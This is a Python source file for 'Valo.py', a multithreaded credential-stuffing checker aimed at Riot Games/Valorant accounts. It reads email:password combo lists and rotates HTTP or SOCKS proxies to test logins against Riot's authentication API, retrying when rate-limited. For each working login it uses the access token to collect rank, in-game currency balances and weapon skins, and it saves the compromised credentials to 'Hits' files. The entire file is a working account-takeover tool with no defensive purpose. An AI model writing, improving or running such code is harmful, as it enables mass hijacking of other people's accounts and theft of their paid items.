import requests, threading,time,os, random,json,tkinter,readchar,urllib3
from colorama import Fore
from tkinter import filedialog
from time import gmtime, strftime
from console import utils
from ctypes import windll


today = strftime("%Y-%m-%d-%H-%M-%S", gmtime())
clear = lambda: os.system('cls')


class Setting():
    global DefaultConfig
    DefaultConfig = {"Auto Remove Dupes": False,"Checker UI":"CUI","ProxyTimeout":3}
    Config = {}

    def ConsolHepler():
        global ErrorIcon,Icon,Icon1,Icon2,Icon3,Icon4,logo

        logo = f"""
        {Fore.LIGHTCYAN_EX}
        
 ██▒   █▓    ▄▄▄          ██▓        ▒█████              ██▓███ ▓██   ██▓
▓██░   █▒   ▒████▄       ▓██▒       ▒██▒  ██▒           ▓██░  ██▒▒██  ██▒
 ▓██  █▒░   ▒██  ▀█▄     ▒██░       ▒██░  ██▒           ▓██░ ██▓▒ ▒██ ██░
  ▒██ █░░   ░██▄▄▄▄██    ▒██░       ▒██   ██░           ▒██▄█▓▒ ▒ ░ ▐██▓░
   ▒▀█░      ▓█   ▓██▒   ░██████▒   ░ ████▓▒░    ██▓    ▒██▒ ░  ░ ░ ██▒▓░
   ░ ▐░      ▒▒   ▓▒█░   ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒▓▒    ▒▓▒░ ░  ░  ██▒▒▒ 
   ░ ░░       ▒   ▒▒ ░   ░ ░ ▒  ░     ░ ▒ ▒░     ░▒     ░▒ ░     ▓██ ░▒░ 
     ░░       ░   ▒        ░ ░      ░ ░ ░ ▒      ░      ░░       ▒ ▒ ░░  
      ░           ░  ░       ░  ░       ░ ░       ░              ░ ░     
     ░                                            ░              ░ ░     
  """


        ErrorIcon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTWHITE_EX}]"
        Icon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}]"
        Icon1 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTWHITE_EX}]"
        Icon2 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTWHITE_EX}]"
        Icon3 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTWHITE_EX}]"
        Icon4 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTWHITE_EX}]"


    def CheckConfig():
        if not os.path.exists("config.json"):
            open("config.json", "a+")
            with open("config.json", "w") as a:
                dumps = json.dump(DefaultConfig,indent=3)
                a.write(dumps)
                a.close()
        else:
            pass  

    def ReadConfig():
        global RemoveDupes,CheckerUI,ProxyTimeout,dumps
        try:
            with open("config.json","r") as OpenFile:
                try:
                    ConfigJson = json.load(OpenFile)
                    RemoveDupes = ConfigJson["Auto Remove Dupes"]
                    CheckerUI = ConfigJson["Checker UI"]
                    ProxyTimeout = ConfigJson["ProxyTimeout"]
                    return [RemoveDupes,CheckerUI,ProxyTimeout]
                except Exception:
                    with open("config.json", "w") as a:
                        dumps = json.dumps(DefaultConfig,indent = 3)
                        a.write(dumps)
                        a.close()
                        Setting.ReadConfig()
        except:
            Setting.CheckConfig()                
    def ConfigUpdate():
        clear = lambda: os.system('cls')
        clear()
        utils.set_title("Valo.py ~ Settings")
        if RemoveDupes == False:
            RemoveDupesColor = Fore.LIGHTRED_EX
        else:
            RemoveDupesColor = Fore.LIGHTGREEN_EX
        print(logo)
        print()
        print(f"{Icon1} Auto Remove Dupes: {RemoveDupesColor} {RemoveDupes}") 
        print(f"{Icon2} Checker UI: {Fore.LIGHTGREEN_EX} {CheckerUI}") 
        print(f"{Icon3} Proxy Timeout: {Fore.LIGHTGREEN_EX} {ProxyTimeout} sec")
        print(f"{Icon4} Back To Menu")
        print()   
        key = repr(readchar.readkey()) 
        
        if key == "'1'":
            if RemoveDupes == False:
                with  open("config.json","r") as r:
                    ConfigJson = json.load(r)
                    ConfigJson["Auto Remove Dupes"] = True
                    ConfigUptade = json.dumps(ConfigJson, indent=3)
                    r.close()
                    with open("config.json", "w") as m:
                        m.write(ConfigUptade)
                        m.close()
                    Setting.ReadConfig()
                    Setting.ConfigUpdate()     
            else:
                with  open("config.json","r") as r:
                    ConfigJson = json.load(r)
                    ConfigJson["Auto Remove Dupes"] = False
                    ConfigUptade = json.dumps(ConfigJson, indent=3)
                    r.close()
                    with open("config.json", "w") as m:
                        m.write(ConfigUptade)
                        m.close()
                    Setting.ReadConfig()    
                    Setting.ConfigUpdate()     
        elif key == "'2'":
            if CheckerUI == "LOG":
                with  open("config.json","r") as r:
                    ConfigJson = json.load(r)
                    ConfigJson["Checker UI"] = "CUI"
                    ConfigUptade = json.dumps(ConfigJson, indent=3)
                    r.close()
                    with open("config.json", "w") as m:
                        m.write(ConfigUptade)
                        m.close()
                    Setting.ReadConfig()    
                    Setting.ConfigUpdate()     
            else:
                with  open("config.json","r") as r:
                    ConfigJson = json.load(r)
                    ConfigJson["Checker UI"] = "LOG"
                    ConfigUptade = json.dumps(ConfigJson, indent=3)
                    r.close()
                    with open("config.json", "w") as m:
                        m.write(ConfigUptade)
                        m.close()
                    Setting.ReadConfig()    
                    Setting.ConfigUpdate()     
        elif key == "'3'":
            try:
                print()
                ProxyTimeOut = input(f"{Icon} Enter Proxy Timeout (sec): ")
                TimeOut = int(ProxyTimeOut)
                with  open("config.json","r") as r:
                    ConfigJson = json.load(r)
                    ConfigJson["ProxyTimeout"] = TimeOut
                    ConfigUptade = json.dumps(ConfigJson, indent=3)
                    r.close()
                    with open("config.json", "w") as m:
                        m.write(ConfigUptade)
                        m.close()
                    Setting.ReadConfig()    
                    Setting.ConfigUpdate()     
            except:
                print(f"{ErrorIcon} Invalid Character...")  
                time.sleep(2)
                Setting.ReadConfig()
                Setting.ConfigUpdate()  
        elif key == "'4'":
            Menu.ConsolHepler()
            Menu.Menu()
        else:
            print(f"{ErrorIcon} Invalid Character...")  
            time.sleep(2)
            Setting.ConfigUpdate()     
                            

class Menu():

    def ConsolHepler():
        global ErrorIcon,Icon,Icon1,Icon2,Icon3,Icon4,logo

        logo = f"""
        {Fore.LIGHTCYAN_EX}
        
 ██▒   █▓    ▄▄▄          ██▓        ▒█████              ██▓███ ▓██   ██▓
▓██░   █▒   ▒████▄       ▓██▒       ▒██▒  ██▒           ▓██░  ██▒▒██  ██▒
 ▓██  █▒░   ▒██  ▀█▄     ▒██░       ▒██░  ██▒           ▓██░ ██▓▒ ▒██ ██░
  ▒██ █░░   ░██▄▄▄▄██    ▒██░       ▒██   ██░           ▒██▄█▓▒ ▒ ░ ▐██▓░
   ▒▀█░      ▓█   ▓██▒   ░██████▒   ░ ████▓▒░    ██▓    ▒██▒ ░  ░ ░ ██▒▓░
   ░ ▐░      ▒▒   ▓▒█░   ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒▓▒    ▒▓▒░ ░  ░  ██▒▒▒ 
   ░ ░░       ▒   ▒▒ ░   ░ ░ ▒  ░     ░ ▒ ▒░     ░▒     ░▒ ░     ▓██ ░▒░ 
     ░░       ░   ▒        ░ ░      ░ ░ ░ ▒      ░      ░░       ▒ ▒ ░░  
      ░           ░  ░       ░  ░       ░ ░       ░              ░ ░     
     ░                                            ░              ░ ░     
  """


        ErrorIcon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTWHITE_EX}]"
        Icon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}]"
        Icon1 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTWHITE_EX}]"
        Icon2 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTWHITE_EX}]"
        Icon3 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTWHITE_EX}]"
        Icon4 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTWHITE_EX}]"

    def Menu():
        utils.set_title("Valo.py ~ Menu")
        clear()
        print(logo)
        print()
        print(f"{Icon} Hello Welcome to Valo.py!")
        print(f"{Icon} Where do you want to go? ")
        print()
        print(f"{Icon1} Checker")
        print(f"{Icon2} Settings")
        print(f"{Icon3} Quit")
        key = repr(readchar.readkey())
        if key == "'1'":
            Valorant.CheckerMenu()
        elif key == "'2'":
            Setting.ConsolHepler()
            Setting.CheckConfig()
            Setting.ReadConfig()
            Setting.ConfigUpdate()
        elif key == "'3'":
            os.abort()
        else:
            print(f"{ErrorIcon} Invalid Character...")  
            time.sleep(2)
            Menu.Menu()




class Valorant():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    global today,clear,emails,passwords,proxylists,Dumpeds,root,sess,logo,ErrorIcon,Icon,Icon1,Icon2,Icon3,Icon4,hits,fail,free,banned,cpm,cpm1,error,retries,checked,ClearNumbers

    hits,fail,free,banned,cpm,cpm1,error,retries,checked = 0,0,0,0,0,0,0,0,0
    clear = lambda: os.system('cls')
    today = time.strftime("%Y-%m-%d")
    ClearNumbers = 0
    emails = []
    passwords = []
    proxylists = []
    Dumpeds = []
    root = tkinter.Tk()
    root.withdraw()
    logo = f"""
    {Fore.LIGHTCYAN_EX}

 ██▒   █▓    ▄▄▄          ██▓        ▒█████              ██▓███ ▓██   ██▓
▓██░   █▒   ▒████▄       ▓██▒       ▒██▒  ██▒           ▓██░  ██▒▒██  ██▒
 ▓██  █▒░   ▒██  ▀█▄     ▒██░       ▒██░  ██▒           ▓██░ ██▓▒ ▒██ ██░
  ▒██ █░░   ░██▄▄▄▄██    ▒██░       ▒██   ██░           ▒██▄█▓▒ ▒ ░ ▐██▓░
   ▒▀█░      ▓█   ▓██▒   ░██████▒   ░ ████▓▒░    ██▓    ▒██▒ ░  ░ ░ ██▒▓░
   ░ ▐░      ▒▒   ▓▒█░   ░ ▒░▓  ░   ░ ▒░▒░▒░     ▒▓▒    ▒▓▒░ ░  ░  ██▒▒▒ 
   ░ ░░       ▒   ▒▒ ░   ░ ░ ▒  ░     ░ ▒ ▒░     ░▒     ░▒ ░     ▓██ ░▒░ 
     ░░       ░   ▒        ░ ░      ░ ░ ░ ▒      ░      ░░       ▒ ▒ ░░  
      ░           ░  ░       ░  ░       ░ ░       ░              ░ ░     
     ░                                            ░              ░ ░     
   """


    ErrorIcon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}!{Fore.LIGHTWHITE_EX}]"
    Icon = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}>{Fore.LIGHTWHITE_EX}]"
    Icon1 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTWHITE_EX}]"
    Icon2 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTWHITE_EX}]"
    Icon3 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTWHITE_EX}]"
    Icon4 = f"{Fore.LIGHTWHITE_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTWHITE_EX}]"

    
    def CreateFolder():
        if not os.path.exists("results"):
            os.makedirs("results/")
        if not os.path.exists('results/{}'.format(today)):
            os.makedirs('results/{}'.format(today))

    def Config():
        global CheckerUI,timeout,RemoveDupes
        Setting.CheckConfig()
        GetSet = Setting.ReadConfig()
        CheckerUI = GetSet[1]
        timeout = GetSet[2]
        RemoveDupes = GetSet[0]

    def LoadCombolist():
        global ComboName
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        ComboName = os.path.basename(fileNameCombo.name)
        if fileNameCombo is None:
            print()
            print(f"{ErrorIcon} Please select valid combo file..")
            time.sleep(2)
            Valorant.LoadCombolist()
        else:
            try:
                with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            email = line.split(":")[0].replace('\n', '')
                            password = line.split(":")[1].replace('\n', '')
                            emails.append(email)
                            passwords.append(password)
                        except:
                            pass
                print(f"{Icon} Loaded [{len(emails)}] combos lines..")
                time.sleep(2)
            except Exception:
                print(f"{ErrorIcon} Your combo file is probably harmed, please try again..")
                time.sleep(2)
                Valorant.LoadCombolist() 
    
    def LoadCombolistDupes():
        global ComboName
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        ComboName = os.path.basename(fileNameCombo.name)
        if fileNameCombo is None:
            print()
            print(f"{ErrorIcon} Please select valid combo file..")
            time.sleep(2)
            Valorant.LoadCombolistDupes()
        else:
            try:
                with open(fileNameCombo.name, 'r+', encoding='utf-8') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            Dump = line.replace('\n', '')
                            Dumpeds.append(Dump)
                        except:
                            print(f"{ErrorIcon} Your combo file is probably harmed, please try again..")
                            time.sleep(2)
                            Valorant.LoadCombolistDupes()
                print(f"{Icon} Dupes are removing...")
                time.sleep(2)        
                Dumped =  list(dict.fromkeys(Dumpeds))
                RemovedLines = len(Dumpeds) - len(Dumped)
                print(f"{Icon} [{RemovedLines}] Lines Removed...")
                time.sleep(1)
                
                for lines in Dumped:
                        try:
                            email = lines.split(":")[0].replace('\n', '')
                            password = lines.split(":")[1].replace('\n', '')
                            emails.append(email)
                            passwords.append(password)
                        except:
                            print(f"{ErrorIcon} Your combo file is probably harmed, please try again..")
                            time.sleep(2)
                            Valorant.LoadCombolistDupes()    
            except Exception:
                print(f"{ErrorIcon} Your combo file is probably harmed, please try again..")
                time.sleep(2)
                Valorant.LoadCombolistDupes()               

    def LoadProxies():
        fileNameProxy = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if fileNameProxy is None:
            print()
            print(f"{ErrorIcon} Please select valid proxy file..")
            time.sleep(2)
            Valorant.LoadProxies()
        else:
            try:
                with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                    ext = e.readlines()
                    for line in ext:
                        try:
                            proxyline = line.split()[0].replace('\n', '')
                            proxylists.append(proxyline)
                        except:
                            pass
                print(f"{Icon} Loaded [{len(proxylists)}] proxies lines..")
                time.sleep(2)
            except Exception:
                print(f"{ErrorIcon} Your proxy file is probably harmed, please try again..")

    def ScreenLOG():
        global hits,fail,free,banned,cpm,cpm1,error,retries,checked,ClearNumbers
        if ClearNumbers == 0:
            clear()
            ClearNumbers = 1
        else:
            pass
        cmp1 = cpm
        cpm = 0
        windll.kernel32.SetConsoleTitleW(f" Valo.py - (By Endless) | Checked: {checked}\{len(emails)} -  Good: {hits} - Bad: {fail} - Customs: {free} - Banned Accounts: {banned} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {error} ")
        time.sleep(1)
        threading.Thread(target=Valorant.ScreenLOG, args=()).start()


        

    def ScreenCUI():
        global hits,fail,free,banned,cpm,cpm1,error,retries,checked
        clear()
        cmp1 = cpm
        cpm = 0
        print(logo)
        print()
        print(" Valo.py Running... [{}]".format(Fore.LIGHTMAGENTA_EX + str(ComboName) + Fore.LIGHTWHITE_EX))
        print(f" [{checked}\{len(emails)}] Checked")
        print(" [{}] Good".format(Fore.LIGHTGREEN_EX + str(hits) + Fore.LIGHTWHITE_EX))
        print(" [{}] Bad".format(Fore.LIGHTRED_EX + str(fail) + Fore.LIGHTWHITE_EX))
        print(" [{}] Banned Accounts".format(Fore.LIGHTBLUE_EX + str(banned) + Fore.LIGHTWHITE_EX))
        print(" [{}] Customs".format(Fore.LIGHTYELLOW_EX + str(free) + Fore.LIGHTWHITE_EX))
        print(" [{}] Retries".format(Fore.LIGHTCYAN_EX + str(retries) + Fore.LIGHTWHITE_EX))
        print(" [{}] Errors".format(Fore.LIGHTYELLOW_EX + str(error) +  Fore.LIGHTWHITE_EX))
        windll.kernel32.SetConsoleTitleW(f" Valo.py - (By Endless) | Checked: {checked}\{len(emails)} -  Good: {hits} - Bad: {fail} - Customs: {free} - Banned Accounts: {banned} - Cpm: {cmp1*60} - Retries: {retries} - Errors: {error} ")
        time.sleep(1)
        threading.Thread(target=Valorant.ScreenCUI, args=()).start()

    def FinishScreen():
        clear()
        print(logo)
        print()
        print(f"{Icon} Checked Finish!...")
        print()
        print(f"{Icon} Info: [Total Good: {hits} | Total Bad: {fail} | Total Custom: {free} | Total Banned Account: {banned}]")
        print(print(f"{Icon} Press any key and exit..."))
        repr(readchar.readkey())
        os.abort()

    

    def Checker(email,password,proxylist):
        try:
            global hits,fail,free,banned,cpm,cpm1,error,retries,checked,UrlList
            sess = requests.Session()
            sess.verify = False
            
             
            proxy = random.choice(proxylist)
            if proxytype  == "'1'":
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'http://{}'.format(proxy)}
            elif proxytype  == "'2'":
                proxy_for_check = {'http': 'socks4://{}'.format(proxy),'https': 'socks4://{}'.format(proxy)}
            elif proxytype  == "'3'":
                    proxy_for_check = {'http': 'socks5://{}'.format(proxy),'https': 'socks5://{}'.format(proxy)}
            else:
                proxy_for_check = {'http': 'http://{}'.format(proxy), 'https': 'http://{}'.format(proxy)}

            sess.proxies = proxy_for_check

                
            UrlList = {"AuthUrl":"https://auth.riotgames.com/api/v1/authorization","EntitlementsUrl":"https://entitlements.auth.riotgames.com/api/token/v1","UserInfoUrl":"https://auth.riotgames.com/userinfo"}

            DefaultHeaders = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Pragma": "no-cache","Accept": "*/*","Content-Type": "application/json"}

            GetAuth = sess.post(UrlList["AuthUrl"],headers=DefaultHeaders,json={"acr_values":"urn:riot:bronze","claims":"","client_id":"riot-client","nonce":"oYnVwCSrlS5IHKh7iI17oQ","redirect_uri":"http://localhost/redirect","response_type":"token id_token","scope":"openid link ban lol_region"},timeout=timeout)
            LoginPostData = {"type":"auth","username":email,"password":password,"remember":False,"language":"en_US"}
            GetLogin = sess.put(UrlList["AuthUrl"],headers=DefaultHeaders,json=LoginPostData,cookies=GetAuth.cookies,timeout=timeout)

            if "access_token" in GetLogin.text:
                AccessToken = GetLogin.text.split("token=")[1].split("&scop")[0]
                Valorant.Capture(AccessToken=AccessToken,User=email,Pass=password,sess=sess)  
            elif "auth_failure" in GetLogin.text:
                checked += 1
                fail += 1
                cpm += 1
            elif "rate_limited" in GetLogin.text:
                retries += 1
                threading.Thread(target=Valorant.Checker, args=(email, password,proxylists)).start()
            else:
                retries += 1
                threading.Thread(target=Valorant.Checker, args=(email, password,proxylists)).start() 
        except Exception as exp:
            error += 1
            threading.Thread(target=Valorant.Checker, args=(email, password,proxylists)).start()
                                   


    def Capture(AccessToken,User,Pass,sess):
        Skin = []
        SkinStr = ""
        global hits,fail,free,banned,cpm,cpm1,error,retries,checked
        RankIDtoRank = {"0":"Unranked","1":"Unused1", "2":"Unused2" ,"3":"Iron 1" ,"4":"Iron 2" ,"5":"Iron 3" ,"6":"Bronz 1" ,"7":"Bronz 2" ,"8":"Bronz 3" ,"9":"Silver 1" ,"10":"Silver 2", "11":"Silver 3" ,"12":"Gold 1" ,"13":"Gold 2" ,"14":"Gold 3" ,"15":"Platinum 1" ,"16":"Platinum 2" ,"17":"Plantinum 3" ,"18":"Diamond 1" ,"19":"Diamond 2" ,"20":"Diamond 3" ,"21":"Immortal 1" ,"22":"Immortal 2" ,"23":"Immortal 3" ,"24":"Radiant"}
        try:
            DefaultHeaders = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko","Pragma": "no-cache","Accept": "*/*","Content-Type": "application/json","Authorization":f"Bearer {AccessToken}"}
            GetEntitlementsToken  = sess.post(UrlList["EntitlementsUrl"],headers=DefaultHeaders,timeout=timeout)  
            EntitlementsToken = GetEntitlementsToken.json()["entitlements_token"]
            GetUserInfo = sess.post(UrlList["UserInfoUrl"],headers=DefaultHeaders,timeout=timeout)
            if '"scope":"ares"' in GetUserInfo.text:
                    if CheckerUI == "LOG":
                        print(f"{Fore.LIGHTYELLOW_EX} [Banned] {User}:{Pass} {Fore.LIGHTWHITE_EX}")
                    checked += 1
                    cpm += 1
                    banned += 1
                    SaveBanned = open("results/{}/Banned.txt".format(today), "a+")
                    SaveBanned.write("{}:{}\n".format(User, Pass))
                    SaveBanned.close()
                    return     
            GameName =  GetUserInfo.text.split('game_name":"')[1].split('"')[0]           
            Tag = GetUserInfo.text.split('tag_line":"')[1].split('"')[0]  
            Sub = GetUserInfo.text.split('sub":"')[1].split('"')[0] 
            EmailVerified = GetUserInfo.text.split('email_verified":')[1].split('"')[0]
            
            GetAccountRegion = sess.get(f"https://api.henrikdev.xyz/valorant/v1/account/{GameName}/{Tag}",timeout=timeout)
            if "region" in GetAccountRegion.text:
                Region = GetAccountRegion.json()["data"]["region"]
                AccountLevel = GetAccountRegion.json()["data"]["account_level"]
            else:
                if CheckerUI == "LOG":
                   print(f"{Fore.LIGHTYELLOW_EX} [Custom] {User}:{Pass} {Fore.LIGHTWHITE_EX}")
                checked += 1
                cpm += 1
                free += 1
                SaveFree = open("results/{}/Custom.txt".format(today), "a+")
                SaveFree.write(f"{User}:{Pass}")
                SaveFree.close()
                return
            PvpNetHeaders = {"Content-Type": "application/json","Authorization": f"Bearer {AccessToken}","X-Riot-Entitlements-JWT": EntitlementsToken,"X-Riot-ClientVersion": "release-02.03-shipping-8-521855","X-Riot-ClientPlatform": "ew0KCSJwbGF0Zm9ybVR5cGUiOiAiUEMiLA0KCSJwbGF0Zm9ybU9TIjogIldpbmRvd3MiLA0KCSJwbGF0Zm9ybU9TVmVyc2lvbiI6ICIxMC4wLjE5MDQyLjEuMjU2LjY0Yml0IiwNCgkicGxhdGZvcm1DaGlwc2V0IjogIlVua25vd24iDQp9"}  
            try:
                CheckRanked = sess.get(f"https://pd.{Region}.a.pvp.net/mmr/v1/players/{Sub}/competitiveupdates",headers=PvpNetHeaders,timeout=timeout)
                if '","Matches":[]}' in CheckRanked.text:
                    Rank = "UnRanked"
                else:
                    RankID = CheckRanked.text.split('"TierAfterUpdate":')[1].split(',"')[0]
                    Rank = RankIDtoRank[RankID]                  
            except:
                Rank = "Unknow"            
            try:
                GetPoints = sess.get(f"https://pd.{Region}.a.pvp.net/store/v1/wallet/{Sub}",headers=PvpNetHeaders,timeout=timeout)
                ValorantPoints = GetPoints.json()["Balances"]["85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741"]
                Radianite = GetPoints.json()["Balances"]["e59aa87c-4cbf-517a-5983-6e81511be9b7"]
            except:
                ValorantPoints = "UnKnow"
                Radianite = "UnKnow"      
            try:
                GetSkins = sess.get(f"https://pd.{Region}.a.pvp.net/personalization/v2/players/{Sub}/playerloadout",headers=PvpNetHeaders,timeout=timeout) 
                Skins = GetSkins.json()["Guns"]
                SkinsLength = len(Skins)
                SkinRange = range(SkinsLength)
                for xs in SkinRange:
                    Skins2 = GetSkins.json()["Guns"][xs]["SkinID"]
                    GetSkinName = sess.get(f"https://valorant-api.com/v1/weapons/skins/{Skins2}")
                    SkinName = GetSkinName.json()["data"]["displayName"]
                    Skin.append(SkinName)
                    SkinStr += "| " + SkinName + "\n"   
            except:
                Skin.clear()
                Skin = "UnKnow"
                SkinStr = "| UnKnow \n"
            if CheckerUI == "LOG":
                print(f"{Fore.LIGHTGREEN_EX} [Good] {User}:{Pass} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)} {Fore.LIGHTWHITE_EX}")   
            hits += 1
            checked += 1
            cpm += 1
            SaveHits = open("results/{}/Hits_Full_Capture.txt".format(today), "a+")
            SaveHits.write(f"[--------------[Valo.py]--------------]\n| User&Pass: {User}:{Pass}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(Skin)})]-------------]\n{SkinStr}[-------------------------------------]\n\n")
            SaveHits.close()
            SaveHitss = open("results/{}/Hits.txt".format(today), "a+")
            SaveHitss.write(f"{User}:{Pass} | Region: {Region} | Level: {AccountLevel} | Email Verified: {EmailVerified} | Rank: {Rank} | VP: {ValorantPoints} | RP: {Radianite} | Total Skins: {len(Skin)}")
            SaveHitss.close()
        except Exception as exp:
           if str(exp) == "list index out of range":
               if CheckerUI == "LOG":
                   print(f"{Fore.LIGHTYELLOW_EX} [Custom] {User}:{Pass} {Fore.LIGHTWHITE_EX}")
               checked += 1
               cpm += 1
               free += 1
               SaveFree = open("results/{}/Custom.txt".format(today), "a+")
               SaveFree.write(f"{User}:{Pass}")
               SaveFree.close()
               return
           else:
                retries += 1 
                threading.Thread(target=Valorant.Checker, args=(User, Pass,proxylists)).start()   


    def CheckerMenu():
        global thread,proxytype
        clear()
        windll.kernel32.SetConsoleTitleW("Valo.py - (By Endless)")
        print(logo)
        print()
        print()
        try:
            thread = int(input(f"{Icon} Threads: "))
        except Exception:
            print(f"{ErrorIcon} Invalid Character...") 
            time.sleep(2)
            Valorant.CheckerMenu() 
        print(f"{Icon} Proxy Type: [1]-Http\s - [2]-Socks4 - [3]-Socks5") 
        proxytype = repr(readchar.readkey())
        print(f"{Icon} Press any key and load combos...")
        Valorant.Config()
        repr(readchar.readkey())
        if RemoveDupes == True:
            Valorant.LoadCombolistDupes()
        else:
            Valorant.LoadCombolist() 
        print(f"{Icon} Press any key and load proxies...") 
        repr(readchar.readkey())
        Valorant.LoadProxies() 
        Valorant.CreateFolder()
        Valorant.Start()  


    def Start():
        if CheckerUI == "LOG":
            Valorant.ScreenLOG()
        elif CheckerUI == "CUI":
            Valorant.ScreenCUI()
        else:
            Valorant.ScreenCUI() 
        num = 0
        while 1:
            if threading.active_count() < int(thread):
                if len(emails) > num:
                    try:
                        num+=1
                        threading.Thread(target=Valorant.Checker, args=(emails[num], passwords[num],proxylists)).start()
                    except:
                        Valorant.FinishScreen() 
                else:
                    Valorant.FinishScreen()                

Menu.ConsolHepler()
Menu.Menu()

# by Endless
